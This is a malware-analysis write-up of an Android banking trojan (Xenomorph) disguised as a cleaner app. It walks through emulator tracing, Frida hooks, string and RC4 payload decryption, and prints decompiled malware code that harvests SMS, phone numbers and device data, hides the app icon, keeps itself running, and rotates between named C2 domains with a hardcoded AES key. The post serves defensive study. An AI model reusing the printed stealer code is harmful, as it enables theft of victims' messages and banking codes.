---
title: "Xenomorph V1"
date: 2024-05-02 00:00:00 +0000
categories: [Malware Analysis]
tags: [Malware Analysis, Info Stealer, APK, Android, Trojan]
---

Xenomorph, a nasty piece of Android malware, has been evolving rapidly. Initially targeting European banks in early 2022, it recently set its sights on over 30 US banks.  This adaptable malware steals login credentials, bypasses two-factor authentication, and can even automate fraudulent transfers through a powerful feature called the Automated Transfer System (ATS).  The group behind Xenomorph, likely a cybercrime group named Hadoken Security,  may be selling the malware as a service (MaaS) to other attackers. Overall, Xenomorph is a dangerous banking trojan capable of significant financial loss for unsuspecting users.

| Property | Value |
| ------ | ----------- |
| File Type   | APK |
| App Name   | Fast Cleaner |
| Package Name   | com.spike.old |
| SHA-256 | 8d813e1a86a762706fdf5237422fbd2a96c5bf16ef724ac873be4dcfa48c1d4a |
| SSDEEP | 24576:yYTOqzcKG/f3HFjIFoneNSwbQRdf1esbQlPRUJuaf5rxY25cGLR4rEjC:yYVcVHl6lrylbQlDaf5rMrEjC |

> This sample is from an earlier 2022 campaign.

## Dynamic Analysis

Quick prep for the emulator by pushing `Frida`, `tcpdump` and installing the malicious APK with `adb push frida-server /data/local/tmp`, `adb push tcpdump /data/local/tmp` and `adb install com.spike.old.apk`.

To capture network traffic from the emulator I'll go ahead and set `tcpdump` to pipe the captured traffic into Wireshark `adb exec-out "/data/local/tmp/tcpdump -i any -U -w - 2>/dev/null" | wireshark -k -S -i -` (I can also just capture the traffic and save it locally then pull the `pcap` out later `tcpdump -i any -U -w capture.pcap`)

With everything in order I'll go ahead and run the sample with `adb shell monkey -p com.spike.old 1`

> Originally developed for app testing, monkey is a helper program on Android that simulates a real user interacting with the target app.
> The trailing 1 refers to the number of user interface events we want monkey to simulate in the target process

The app displays the following screen tricking the user into granting it accessibility permissions.

![accessibility](assets/img/posts/2024-05-02-Xenomorph/app_running.png)

The code for this window is AES decrypted and displayed to the user via WebView.

![accessibility](assets/img/posts/2024-05-02-Xenomorph/permission.png)

Now let's take a look at the filesystem changes caused by the sample with `adb shell "find /data/data/com.spike.old -type f -exec file {} \;"`

![filesystem](assets/img/posts/2024-05-02-Xenomorph/filesystem_changes.png)

Two of these are looking very interesting `/data/data/com.spike.old/shared_prefs/ring0.xml` and `/data/data/com.spike.old/app_DynamicOptDex/hq.json`.

I'll pull them out for further analysis with `adb pull /data/data/com.spike.old`.

Here's the `ring0.xml` which is the app's Shared Preferences object which looks like a configuration file with an interesting domain `kart12sec[.]gq`

```xml
<?xml version='1.0' encoding='utf-8' standalone='yes' ?>
<map>
    <string name="ANCT">kart12sec.gq</string>
    <string name="LPTG"></string>
    <string name="DSTI">744a4288-1fca-408a-9f6d-d2e6f2b6640d</string>
    <string name="AITT"></string>
    <string name="LSTG">com.android.launcher3.uioverrides.quicksteplauncher</string>
    <string name="ACTG">1</string>
    <string name="NSTG">2</string>
    <string name="AIEN">1</string>
</map>
```

After doing some code analysis later, it gets more clear what each value means :

| Tag | Meaning |
| ------ | ----------- |
| ANCT | `ActualNetworkConnection` Currently active C2  |
| LPTG | `lastProcessedScreenTag` Last processed accessbility event class name |
| DSTI | `debugStateIdTag` Randomly generated UUID |
| AITT | `appInjectTableTag` Table of apps/overlays injections |
| LSTG | `lastScreenTag` Last accessbility event class name |
| NSTG | `networkStateTag` If it greater than `0` then the malware already holds an active connection with C2 |
| AIEN | `appInjectsEnabledTag` Overlay injection status (Enabled/Diabled `0`) |
| AITG | `appInjectTag` Overlay injected app package name |
| ABTG | `autoBackTag` I'm not sure how this and the following ones work but Xenomorph has already set accessbility event types such as `TYPE_VIEW_CLICKED`, `TYPE_WINDOW_STATE_CHANGED` to log and interact with. This one probably handles actions it can take in case if another event type occured. |
| ACTG | `autoClickTag` Action to take on event occurance |
| AHTG | `autoHomeTag` Action to take on event occurance |
| SITG | `startIntentTag` Action to take on event occurance |
| AUTG | `accessibilityUndoneTag` Action to take on event occurance |
| XBTG | `batteryOptimizationDisabled` Doze mode (enabled/disabled) |
| ESTG | `endlessServiceStatus` Service status flag (e.g holds value "`running`" if it's enabled). The service is responsible for the WakeLock and monitoring user presence |
| NIEN | `notificationsIcEnabledTag` I believe to be a notification interception feature flag |
| SID | `secureIdTag` 16 Bytes key used in securing communication between the malware and C2 with AES algorithm |
| SITS | `secureIdTimestampTag` 16 bytes AES key timestamp |
| SDST | `smsDefaultAppIsSetTag` A flag if Xenomorph is the SMS manager |
| SIEN | `smsIcMeantToBeEnabledTag` I believe to be an SMS interception feature flag |
| SSTG | `smsSavedTag` A list of saved SMS messages |
| UPEN | `userPresent` Holds the value of `0` if the screen is off |
| UTUI | `userTriedUninstall` Indication of user trying to delete the malicious app or disable its accessbility permission |

The `hq.json` file is kinda interesting, it actually has `PK` magic headers.

![hq.json](assets/img/posts/2024-05-02-Xenomorph/hq.png)

So this looks like a Json-packed sample. This and the `ring0.xml` are very similar to the one used by [Alien](https://drive.google.com/file/d/1qd7Nqjhe2vyGZ5bGm6gVw0mM1D6YDolu/view) malware, Also some code reusability can be noticed in Xenomorph based on Alien, It'll get clearer throughout the analysis.

I'll also check if there are debug log data for our sample using `Logcat`.

```bash
adb shell "ps | grep com.spike.old"
```

```bash
adb logcat --pid=3914
```

And YEP looks like the malware authors forgot to remove log statements in their final release

![logs](assets/img/posts/2024-05-02-Xenomorph/logs.png)

For the captured traffic, unfortunately, it looks like the C2 is down or could have been deactivated. The same goes for `kart12sec[.]gq` found in the XML file.

![traffic](assets/img/posts/2024-05-02-Xenomorph/pcap.png)

But a good thing is, that the Logs we got might give us an idea of its behavior including how the communication is supposed to be like in addition to which classes and services are being run and what information is being gathered about the infected device.

![logs](assets/img/posts/2024-05-02-Xenomorph/logs1.png)

It sets a persistence with the WakeLock, verifies if it has the permissions it needs and goes ahead grabbing SMS messages, phone numbers and the device name in addition to the apps currently installed on the device. Furthermore, it logs which apps the user interacts with utilizing its accessibility permission. Also, it looks like the traffic is going to be encrypted with probably an "AES" algorithm as there are "IV" and a "key". This can be verified by using `frida-trace` :

```bash
frida-trace -U -j javax.crypto.Cipher!* -j javax.crypto.spec.SecretKeySpec!* -f com.spike.old
```

![frida-trace](assets/img/posts/2024-05-02-Xenomorph/trace.png)

It seems that the key is hardcoded `5f 9e 4a 92 b1 d8 c8 b9 8d b9 b7 f8 f8 80 0d 2e`. The URL is `simpleyo5[.]tk/ping` and it concats the key, url and uid (randomly generated ID) into the concat field and `SHA-256` hashes it.

Since the encryption details are now known, the huge blob in the `id` field can be decrypted :

![aes_decrypt](assets/img/posts/2024-05-02-Xenomorph/cyberchef.png)

So the `id` field contains the AES encrypted "`payload`". But since the field wasn't fully logged, I can also use Frida hooking to intercept the full plaintext before it's encrypted.

```python
import sys
import frida
import time

def write_data(file_prefix, data):
    current_time = round(time.time() * 1000)
    filename = f'{current_time}_{file_prefix}.bin'
    print('Writing file:', filename)
    with open(filename, 'wb') as output_file:
        output_file.write(bytearray((d % 0xFF for d in data)))

def inject_script(session):
    def on_message(message, _):
        if message['type'] == 'send':
            if 'input' in message['payload']:
                write_data('iv', message['payload']['iv'])
                write_data('input', message['payload']['input'])
            elif 'output' in message['payload']:
                write_data('output', message['payload']['output'])
            elif 'key' in message['payload']:
                write_data('key', message['payload']['key'])
            else:
                print('Unknown message: ', message)
        else:
            print('Unknown message: ', message)

    script = session.create_script("""console.log("Loading Javascript");
                                    Java.perform(() => {
                                    const Cipher = Java.use("javax.crypto.Cipher");
                                    Cipher.doFinal.overload('[B').implementation = function(arr) {
                                    send( {'input': arr, 'iv': this.getIV() });
                                    const result = this.doFinal(arr);
                                    send( {'output': result });
                                    return result;
                                    };
                                    const SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
                                    SecretKeySpec.$init.overload(
                                    "[B", "int", "int", "java.lang.String").implementation = function(
                                    arr, off, len, alg) {
                                    send( {'key': arr} );
                                    return this.$init(arr, off, len, alg);
                                    };
                                    });
                                    console.log("Javascript loaded");""")
    script.on('message', on_message)
    script.load()

def main():
    emulator = frida.get_usb_device()
    pid = emulator.spawn('com.spike.old')
    session = emulator.attach(pid)
    inject_script(session)
    emulator.resume(pid)
    sys.stdin.read()
    session.detach()

if __name__ == '__main__':
    main()
```

Here's the JavaScript script :

```javascript
console.log("Loading Javascript");

Java.perform(() => {
  const Cipher = Java.use("javax.crypto.Cipher");
  Cipher.doFinal.overload('[B').implementation = function(arr) {
    send( {'input': arr, 'iv': this.getIV() });
    const result = this.doFinal(arr);
    send( {'output': result });
    return result;
  };
  const SecretKeySpec = Java.use("javax.crypto.spec.SecretKeySpec");
  SecretKeySpec.$init.overload(
  "[B", "int", "int", "java.lang.String").implementation = function(arr, off, len, alg) {
    send( {'key': arr} );
    return this.$init(arr, off, len, alg);
  };
});
console.log("Javascript loaded");
```

And here it is :

![permissions](assets/img/posts/2024-05-02-Xenomorph/aes_hook_script.png)

```json
{
  "api":30,
  "apps":["com.android.cts.priv.ctsshim","com.android.internal.display.cutout.emulation.corner",...],
  "imei":"7b99d875a8aff3e0",
  "model":"Unknown Android SDK built for x86",
  "numbers":["No numbers"],
  "tag":"cleaner0902",
  "uid":"7b99d875a8aff3e0"
}
```

The `KingService` seems to contain a lot of important functionality, this should be further investigated.

## Static Analysis

I'll go ahead and load it up to `jadx` to take a look at the manifest and the decompiled Java code.

Examining an app's manifest file can reveal a lot about its potential behavior, and can disclose what kind of data the app might collect and how it interacts with the system in addition to some telltale signs about the file being packed.

![permissions](assets/img/posts/2024-05-02-Xenomorph/permissions.png)

Looking at the permissions we notice excessive access; The app requests access to a vast amount of data, including phone state (calls, voicemail), location, SMS messages (potentially including verification codes or other sensitive information), contact details, all installed apps, and even the ability to disable the lock screen and possibly send SMS messages without user interaction. In addition to drawing on top of other apps, `SYSTEM_ALERT_WINDOW` gives the app a high degree of control over the victim device, potentially allowing it to install additional malware.

 Additionally, the sample here seems to be designed to run at boot (`RECEIVE_BOOT_COMPLETED`) - which we can also notice in the receivers section - and persistently (`WAKE_LOCK`).

![receivers](assets/img/posts/2024-05-02-Xenomorph/receivers.png)

In the previous screenshot, we notice the receiver responsible for intercepting incoming SMS messages but the class `com.sniff.sibling.Services.SmsReceiver` nor the package `com.sniff.sibling` exists in the `jadx` file browser which is a clear sign that this class will be dynamically loaded after unpacking the sample/loading other stages.

Since only one class is mentioned in the manifest that already exists (`com.spike.old.CToKhLqQwJbTrQrKg`), I thought I'd start from there...

Scrolling through some lines of junk and obfuscated code, one thing stands out a bit which looks like a decryption routine

![interesting code](assets/img/posts/2024-05-02-Xenomorph/decryption_routine.png)

Cleaning this up a bit we can clearly see the decryption code here

```java
    public static String economyuniform() {

        byte[] bArr = {97, 60, 75, 36, 72, 44, 70, 10, 85, 49, 97, 32, 93}; // Encrypted bytes

        byte[] bArr2 = new byte[13]; // Decrypted bytearray

        byte[] bArr3 = {37, 69}; // XOR Key
    
        int i7 = 0;
        while (i7 < 13) {

            bArr2[i7] = (byte) (bArr[i7]) ^ bArr3[i7 % 2];

            i7++;

        }

        return new String(bArr2);
    }
```

It's a simple XOR with a hardcoded key so I wrote this simple Python script to fetch, decrypt and print strings in functions with a similar signature to the previous one.

```python
class_code = """  ...  """

patterns = [
    r"\b(\w+)\(\)\s\{",                 # Function Name
    r"byte\[\]\s+bArr\s+=\s+({.*?});",  # Encrypted Bytes
    r"byte\[\]\s+bArr3\s+=\s+({.*?});", # Key
]

fun_regexp = re.compile(patterns[0])
fun_matches = re.findall(fun_regexp, class_code)

bytes_regexp = re.compile(patterns[1])
bytes_matches = re.findall(bytes_regexp, class_code)

key_regexp = re.compile(patterns[2])
key_matches = re.findall(key_regexp, class_code)

for index in range(0,len(bytes_matches)):
    encrypted = list(map(int, bytes_matches[index].replace("Byte.MAX_VALUE", "127")[1:-1].split(',')))
    key = list(map(int, key_matches[index].replace("Byte.MAX_VALUE", "127")[1:-1].split(',')))
    decrypted_bytes = bytearray()
    
    # Decryption code
    for x in range(0, len(encrypted)):
        decrypted_bytes.append(encrypted[x]^key[x%len(key)])
    string = decrypted_bytes.decode('utf8')
    print(fun_matches[index] + "() : " + string)

```

Output example for the class I previously mentioned :

```text
alreadywhere() : mOuterContext
censustaxi() : hq.json
cubeglide() : ok replace string bitch
curvesmall() : check the main aim
economyuniform() : DynamicOptDex
entrymessage() : story repeats
executecombine() : android.app.LoadedApk
glancerisk() : DynamicLib
largeluxury() : mInitialApplication
methodjoy() : attach
photogauge() : android.app.ContextImpl
plungestrategy() : mActivityThread
repairgloom() : android.app.ActivityThread
satisfylaundry() : mPackageInfo
shallowdebate() : tree hash up
sharetomorrow() : elevation actor tank
soonmaterial() : mAllApplications
stuffreason() : com.sniff.sibling.MainApplication
weaponabsent() : mApplication
```

And here it is, the `hq.json` that was dropped to the system. The resource itself is encrypted but following it through the code and decrypting another class strings along the way :

```text
blankettenant() : getClass
blossomsing() : getClass
burgerchurn() : vcpspdlsdlsdl
candymuffin() : getClass
candyweapon() : Nchxydggvgd
changeknow() : close
chunktiny() : vcosdYYDSHDnncx
clogquarter() : cuvudshdhdfhdfh
cooldeer() : write
differreceive() : bnhfdcxfdfRRD
doctorheavy() : vSEEEDEECEff
educatebelow() : wwysyahcxhgfGDG
forcewise() : hvchhfhddsds
gaspvery() : opdspclxldsqq
greengasp() : open
harshhusband() : cxuudsjfjdfjdj
homebefore() : getClass
hornspoil() : plumb rescue
isolatewagon() : read
lifttypical() : getClass
lumberfox() : getBytes
mainfriend() : getClass
mixedcook() : vcuufUUUDf
motorelephant() : read
offerpromote() : 41122
openphrase() : dfttrrcfsdVCv
organabsorb() : vocodpsdps
oystertrain() : addAssetPath
parentorient() : vfsffjjjjjjjjjjjjj
phraseseat() : aaxxwdDFCxcds
rotatepig() : close
ruralupdate() : cxoasjshdfhdfh
streetenemy() : Ianj
tenpurpose() : getAssets
weekendknow() : close
```

This looks like [paranoid](https://github.com/MichaelRocks/paranoid) obfuscator which has a deobfuscator tool [here](https://github.com/cryptax/misc-code/blob/master/frida_hooks/michaelrocks.js) but I had already practiced my Regex in a poorly made Python script :D. The obfuscator seems to be common as I've already seen it in a BianLian's Hydra malware sample. Looks like Hydra and Xenomorph used the same loader at the time. [Reference](https://blog-cyber.riskeco.com/en/key-points-for-hydra-bianlian-samples-analysis/)

We can find good clues here to follow like `getAssets`, `getBytes` and `write` so I'll stick with the latter and find my way back to where it was called in the code.

![write_file](assets/img/posts/2024-05-02-Xenomorph/write_file.png)

The `write_file` function takes in two parameters, the second is a wrapper to get the absolute path, the first one tho is interesting as it contains the decryption routine:

![decryption routine](assets/img/posts/2024-05-02-Xenomorph/rc4.png)

After some cleaning, it looks like an [RC4 algorithm](https://en.wikipedia.org/wiki/RC4#Key-scheduling_algorithm_(KSA)) :

```java
private int[] key_schedule(byte[] bArr) {
        
        int[] iArr = new int[256];
        
        for (int i = 0; i < 256; i++) {
            iArr[i] = i;
        }
        int length = bArr.length;
       
        int i2 = 0;
        for (int i3 = 0; i3 < 256; i3++) {
            
            i2 = (i2 + iArr[i3] + bArr[i3 % length] + 256) % 256;
            
            swap_values(i3, i2, iArr);
        }

        return iArr;
    }

    private void swap_values(int i, int i2, int[] iArr) {

        int i5 = iArr[i];

        iArr[i] = iArr[i2];

        iArr[i2] = i5;

    }

    public byte[] rc4_decrypt(byte[] bArr) {

        Method getClass_method = GetMethod_wrapper("getClass", null);

        getClass_method.setAccessible(true);

        Method GetBytes_method = GetMethod_wrapper("GetBytes", null);

        byte[] bArr2 = (byte[]) invoke_method(GetBytes_method, "Ianj", null);
 
        LRuNnLk = key_schedule(bArr2);

        byte[] bArr3 = new byte[(int) Math.floor(bArr.length)];

        int[] iArr = LRuNnLk;
        for (int i3 = 0; i3 < Math.ceil(bArr.length); i3++) {

            counter_i = (counter_i + 1) % 256;

            counter_j = (counter_j + iArr[counter_i]) % 256; 

            swap_values(counter_i, counter_j, iArr);

            int i14 = iArr[(iArr[counter_i] + iArr[counter_j]) % 256];

            bArr3[i3] = (byte)((i14) ^ bArr[i3]);

        }

        return bArr3;
    }
```

And this looks like our key :

![possible key](assets/img/posts/2024-05-02-Xenomorph/key.png)

Here's a Python script to decrypt the `hq.json` payload :

```python
import sys

def swap(arr, i, j):
  arr[i], arr[j] = arr[j], arr[i]

def rc4_key_schedule(key):
  S = list(range(256))
  j = 0
  for i in range(256):
    j = (j + S[i] + key[i % len(key)]) % 256
    swap(S, i, j)
  return S

def rc4_decrypt(data, key):
  S = rc4_key_schedule(key)
  i = 0
  j = 0
  decrypted = bytearray(len(data))
  for k in range(len(data)):
    i = (i + 1) % 256
    j = (j + S[i]) % 256
    swap(S, i, j)
    t = (S[i] + S[j]) % 256
    decrypted[k] = data[k] ^ S[t]
  return decrypted


if __name__ == "__main__":

  if len(sys.argv) != 3:
    print("Usage: RC4_decrypt.py encrypted_file key")
    sys.exit(1)

  filename = sys.argv[1]
  key = sys.argv[2].encode()

  with open(filename, 'rb') as f:
    encrypted_data = f.read()

  decrypted_data = rc4_decrypt(encrypted_data, key)

  decrypted_filename = filename[:-5] + "_decrypted.apk"
  with open(decrypted_filename, 'wb') as f:
    f.write(decrypted_data)

  print("Decryption successful! Decrypted file:", decrypted_filename)
```

## Xenomorph Payload Analysis

Now with the payload decrypted, I can further investigate the full functionality of the malware.

`droidlysis` provides a good overview of what it does :

![droidlysis](assets/img/posts/2024-05-02-Xenomorph/droidlysis.png)

But I'll jump right into the code

![main activity](assets/img/posts/2024-05-02-Xenomorph/main.png)

It checks if `FitnessAccessibilityService` is running, if not it starts some initialization including requesting accessibility permission from the user. It starts a loop in a new thread. It potentially shows a push notification every 15 seconds with the app name and title, it also makes the notification appear as a high priority. This loop continues until the accessibility service becomes enabled.

It also starts the `KingService` and sets up persistence.

And interestingly it checks if it's a Xiaomi or an Oppo device to hide the app icon from the launcher.

![hide activity](assets/img/posts/2024-05-02-Xenomorph/hide_activity.png)

```java
public static void deleteLabelIcon(Context context) {
  context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, MainActivity.class), 2, 1);
}
```

Anyways, `FitnessAccessibilityService` and `UtilGlobal` seem to contain core functionality.

### Utilities

Here's a quick rundown of the main utilities found in `UtilGlobal` :

#### 1 - SMS and Phone Numbers Grabber

This code snippet retrieves all SMS messages (Inbox, Sent, and Draft) from the device and stores them in a list that will eventually be saved in the `ring0.xml`.

```java
    public static List<SmsModel> getAllSMS(Context context) {
        ArrayList arrayList = new ArrayList();
        try {
            String[] strArr = {"sms/inbox", "sms/sent", "sms/draft"};
            String str = HttpUrl.FRAGMENT_ENCODE_SET;
            for (int i = 0; i < 3; i++) {
                String str2 = strArr[i];
                Cursor query = context.getContentResolver().query(Uri.parse("content://" + str2), null, null, null, null);
                if (query != null) {
                    while (query.moveToNext()) {
                        arrayList.add(SmsModel.fromCursor(query));
                        str = str + SmsModel.fromCursor(query).toString() + ", ";
                    }
                    query.close();
                    Log(Constants.smsSavedTag, str2 + ": " + str);
                    SettingsWrite(context, Constants.smsSavedTag, str);
                }
            }
        } catch (Exception e) {
            Log("ErrorGetSavedSMS", "getSMS" + e);
        }
        return arrayList;
    }
```

```java
    public static String[] getPhoneNumbers(Context context) {
        ArrayList arrayList = new ArrayList();
        SubscriptionManager from = SubscriptionManager.from(context);
        if (context.checkCallingOrSelfPermission("android.permission.READ_PHONE_STATE") == 0) {
            Log("getPhoneNumbers", "Permissions ok");
            List<SubscriptionInfo> activeSubscriptionInfoList = from.getActiveSubscriptionInfoList();
            if (activeSubscriptionInfoList != null) {
                Log("getPhoneNumbers", "subInfoList size: " + activeSubscriptionInfoList.size());
                Log("getPhoneNumbers", "subInfoList: " + activeSubscriptionInfoList.toString());
                for (SubscriptionInfo subscriptionInfo : activeSubscriptionInfoList) {
                    Log("getPhoneNumbers", "+ subscriptionInfo: " + subscriptionInfo);
                    Log("getPhoneNumbers", "+ number: " + subscriptionInfo.getNumber());
                    arrayList.add(subscriptionInfo.getNumber());
                }
            } else {
                Log("getPhoneNumbers", "subInfoList is null");
                arrayList.add("No numbers");
            }
        } else {
            Log("getPhoneNumbers", "Permissions check failed");
        }
        if (arrayList.isEmpty() || arrayList.contains(null) || arrayList.get(0) == null) {
            return new String[]{"No numbers"};
        }
        return (String[]) arrayList.toArray(new String[0]);
    }
```

`SettingsWrite` function is responsible for writing shared preferences with the second argument being the key and the third being the value.

#### 2 - Notification Listener

Enables a notification listener. The listener is launched with the flag `FLAG_ACTIVITY_NEW_TASK` which ensures the settings activity is launched as a new task.

It logs notifications (app, title, text) and actions. and can also remove notifications.

```java
    public static void grantNotificationListenerAccess(Context context) {
        if (isNotificationServiceEnabled(context)) {
            return;
        }
        if (Build.VERSION.SDK_INT >= 30) {
            SettingsWrite(context, Constants.lastProcessedScreenTag, "com.android.settings.settings$notificationaccesssettingsactivity");
        }
        Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
        intent.addFlags(268435456); /* FLAG_ACTIVITY_NEW_TASK */
        context.startActivity(intent);
    }
```

#### 3 - KingService Launcher

Starts the `KingService` which ensures the malicious functionality is running including SMS grabbing, WakeLock persistance, setting up network connectivity, making sure `FitnessAccessibilityService` is on and logging user screen interactions.

```java
    public static boolean startKingService(Context context) {
        try {
            if (isServiceRunning(context, KingService.class)) {
                return false;
            }
            context.startService(new Intent(context, KingService.class));
            return true;
        } catch (Exception unused) {
            if (!isIgnoringBatteryOptimizations(context)) {
                startDozeMode(context);
            }
            Log("run_king_service", "error1");
            return false;
        }
    }
```

#### 4- Boot Persistence

This code sets up a repeating alarm that triggers a service (`BootReceiverService`) every 10 seconds. This service checks for device boot completion and user presence/absence based on received broadcasts. It starts different services (`KingService` or `EndlessService` that is responsible for user presence status logging) depending on specific conditions like accessibility service state or user presence.

```java
    public static void startRepeatingAlarm(Context context, Class<?> cls, String str, long j) {
        try {
            Intent intent = new Intent(context, cls);
            intent.setAction(str);
            ((AlarmManager) context.getSystemService("alarm")).setRepeating(0, System.currentTimeMillis() + j, j, PendingIntent.getBroadcast(context, 0, intent, 0));
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
```

```java
UtilGlobal.startRepeatingAlarm(this, BootReceiverService.class, "check", 10000L);
```

#### 5- Changing the system default SMS App

This requests Xenomorph to become the default SMS application on the infected device.

#### 6- Notification Interception

Enabling/disabling a notification interception feature.

#### 7- SMS Interception

Enabling/disabling an SMS interception feature.

#### 8- Checking Permissions

This checks if the malware is granted the permissions it needs with the ability to report back with what permissions it currently has including if it's working as the defualt SMS app, if it has the notification listener active and if it has disabled battery optimization mode (doze mode).

A list of generic permissions can be noticed in the code snippet below alongside the AES key and a list of C2s.

```java
    static {
        String[] strArr = new String[10];
        strArr[0] = "android.permission.READ_SMS";
        strArr[1] = "android.permission.RECEIVE_SMS";
        strArr[2] = "android.permission.WAKE_LOCK";
        strArr[3] = "android.permission.RECEIVE_BOOT_COMPLETED";
        strArr[4] = "android.permission.ACCESS_NETWORK_STATE";
        strArr[5] = "android.permission.INTERNET";
        strArr[6] = "android.permission.READ_PHONE_STATE";
        strArr[7] = Build.VERSION.SDK_INT > 28 ? "android.permission.USE_FULL_SCREEN_INTENT" : null;
        strArr[8] = Build.VERSION.SDK_INT > 28 ? "android.permission.FOREGROUND_SERVICE" : null;
        strArr[9] = Build.VERSION.SDK_INT > 28 ? "android.permission.READ_PHONE_NUMBERS" : null;
        permissions = strArr;
        testKey = UtilEncryption.hexStringToBytes("5f9e4a92b1d8c8b98db9b7f8f8800d2e");
        apis = Arrays.asList("simpleyo5.tk", "simpleyo5.cf", "kart12sec.ga", "kart12sec.gq");
    }
```

```java
    public static String[] getPermissionsStats(Context context) {
        ArrayList arrayList = new ArrayList();
        if (isSmsDefaultAppSet(context)) {
            arrayList.add("sms_manager");
        }
        if (isNotificationServiceEnabled(context)) {
            arrayList.add("notification_manager");
        }
        if (Objects.equals(SettingsRead(context, Constants.batteryOptimizationDisabled), DiskLruCache.VERSION_1)) {
            arrayList.add("doze_mode");
        }
        if (checkPermissions(context)) {
            arrayList.add("generic_permissions");
        }
        return (String[]) arrayList.toArray(new String[0]);
    }
```

#### 9- Overlay Injection

Managing overlays to mimic specific apps and steal user-sensitive data, the overlays to be injected and corresponding apps are to be received from the C2 in the form of a JSON file.

![overlay injection](assets/img/posts/2024-05-02-Xenomorph/overlay_injection.png)

#### 10- Information Gathering

Collecting information about the infected system such as Android ID, device model and manufacturer and a list of installed packages.

```java
    public static String getAndroidID(Context context) {
        return Settings.Secure.getString(context.getContentResolver(), "android_id");
    }

    public static String getDeviceName() {
        String str = Build.MANUFACTURER;
        String str2 = Build.MODEL;
        Log("getDeviceName", str + " " + str2);
        if (str2.toLowerCase().startsWith(str.toLowerCase())) {
            return capitalizeString(str2);
        }
        return capitalizeString(str) + " " + str2;
    }

    public static String[] getInstalledPackages(Context context) {
        ArrayList arrayList = new ArrayList();
        for (PackageInfo packageInfo : context.getPackageManager().getInstalledPackages(0)) {
            arrayList.add(packageInfo.packageName);
        }
        return (String[]) arrayList.toArray(new String[0]);
    }
```

#### 11- Deletion and Permission Revoking Prevention

It checks if the user tried uninstalling the app or revoking its accessibility permissions.

![deletion prevention](assets/img/posts/2024-05-02-Xenomorph/deletion.png)

![accessibility prevention](assets/img/posts/2024-05-02-Xenomorph/accessability.png)

#### 12- Doze Mode

Managing Doze mode/battery optimization which attempts to conserve battery by restricting apps' access to network and CPU-intensive services. So eventually Xenomorph will be bypassing that.

![doze management](assets/img/posts/2024-05-02-Xenomorph/managine_doze.png)

![doze bypass](assets/img/posts/2024-05-02-Xenomorph/doze.png)

#### 13- Xenomorph Logging

The function used for logging can also be noticed here.

```java
    public static void Log(String str, String str2) {
        Log.d("pioneer_bridge_over_white_rabbits (" + str + ")", str2);
    }
```

#### 14- C2 Verification

It seems to be "verifying" with the C2 by fetching an "id" that is later used as a 16-byte AES key. Looks like the key is only valid for 5 minutes so it will "verify" with the C2 to get a new key every time to further secure its communications.

```java
    public static void setVerification(Context context, String str) {
        SettingsWrite(context, Constants.secureIdTag, str);
        long currentTimeMillis = System.currentTimeMillis();
        SettingsWrite(context, Constants.secureIdTimestampTag, String.valueOf(currentTimeMillis));
        Log("setVerification", "Client verified: " + str);
        Log("setVerification", "Timestamp: " + currentTimeMillis);
    }

    public static String getVerification(Context context) {
        return SettingsRead(context, Constants.secureIdTag);
    }

    public static byte[] getVerificationBytes(Context context) {
        String verification = getVerification(context);
        if (verification == null || verification.isEmpty()) {
            return null;
        }
        return UtilEncryption.decodeBase64(verification);
    }

    public static boolean checkClientVerification(Context context) {
        String SettingsRead = SettingsRead(context, Constants.secureIdTag);
        return (SettingsRead == null || SettingsRead.isEmpty()) ? false : true;
    }

    public static long getClientVerificationTimestamp(Context context) {
        String SettingsRead = SettingsRead(context, Constants.secureIdTimestampTag);
        Log("getClientVerificationTimestamp", "verificationTimestamp: " + SettingsRead);
        if (SettingsRead != null && !SettingsRead.isEmpty()) {
            Log("getClientVerificationTimestamp", "verificationTimestamp long: " + Long.getLong(SettingsRead, (Long) 0L));
            try {
                return Long.parseLong(SettingsRead, 10);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return 0L;
    }

    public static boolean clientVerificationExpired(Context context, long j) {
        Log("clientVerificationExpired", "period: " + j);
        long clientVerificationTimestamp = getClientVerificationTimestamp(context);
        Log("clientVerificationExpired", "verificationTimestamp: " + clientVerificationTimestamp);
        long currentTimeMillis = System.currentTimeMillis();
        Log("clientVerificationExpired", "current timestamp: " + currentTimeMillis);
        long j2 = currentTimeMillis - clientVerificationTimestamp;
        Log("clientVerificationExpired", "time since expiration: " + (j2 - j));
        return j2 > j;
    }
```

#### 15- Network Utilities

As noticed earlier it contains a list of 4 C2 URLs, if one is down it sets the next one as an "`ActualNetworkConnection`".

Additionally, it sets a flag if the malware is already in a connection with the C2, if it's `0` then there's no connection active at the time.

```java
    public static void flagNetworkAsBusy(Context context, int i) {
        SettingsWrite(context, Constants.networkStateTag, Integer.toString(i));
    }

    public static int isNetworkBusy(Context context) {
        String SettingsRead = SettingsRead(context, Constants.networkStateTag);
        if (SettingsRead == null || SettingsRead.equals("0")) {
            return 0;
        }
        return Integer.parseInt(SettingsRead(context, Constants.networkStateTag));
    }

    public static void changeActualNetworkConnection(Context context) {
        String SettingsRead = SettingsRead(context, Constants.actualNetworkConnectionTag);
        if (SettingsRead == null || SettingsRead.isEmpty()) {
            SettingsWrite(context, Constants.actualNetworkConnectionTag, Constants.apis.get(0));
            return;
        }
        int indexOf = Constants.apis.indexOf(SettingsRead);
        if (indexOf == -1) {
            return;
        }
        int i = indexOf + 1;
        SettingsWrite(context, Constants.actualNetworkConnectionTag, Constants.apis.get(i != Constants.apis.size() ? i : 0));
    }

    public static void setActualNetworkConnection(Context context, int i) {
        SettingsWrite(context, Constants.actualNetworkConnectionTag, Constants.apis.get(i));
    }

    public static String getActualNetworkConnection(Context context) {
        return SettingsRead(context, Constants.actualNetworkConnectionTag);
    }
```

### KingService

The service is responsible for setting up the default C2 communication, creating a WakeLock for the malicious services and grabbing all SMS. Starting off by checking if there's network connectivity then verifying with the C2, getting a list of overlay injections (or updating the already existing table) and reporting back with the user presence status, if the user tried revoking permissions or uninstalling the malware and getting the permissions status.

The notification listener and doze mode bypass are also set at this point

It also sets up the boot persistence and a notification channel and ensures the `FitnessAccessibilityService` is running.

### FitnessAccessibilityService

The service is responsible for setting up a UUID and monitoring the user activity :

```java
    public void onAccessibilityEvent(AccessibilityEvent accessibilityEvent) {
        UtilGlobal.SettingsWrite(this, Constants.debugStateIdTag, UUID.randomUUID().toString());
        UtilGlobal.Log("onAccessibilityEvent", "### New event with source: " + accessibilityEvent.getSource());
